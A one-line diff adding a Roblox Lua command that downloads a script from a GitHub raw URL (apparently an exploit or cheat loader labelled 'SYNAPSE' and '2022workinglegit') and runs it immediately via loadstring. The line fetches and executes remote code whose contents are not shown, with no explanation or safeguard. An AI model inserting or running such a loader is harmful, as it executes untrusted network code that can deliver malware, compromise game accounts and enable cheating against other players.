@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/fortnitemodder/SYNAPSE/main/2022workinglegit')))()
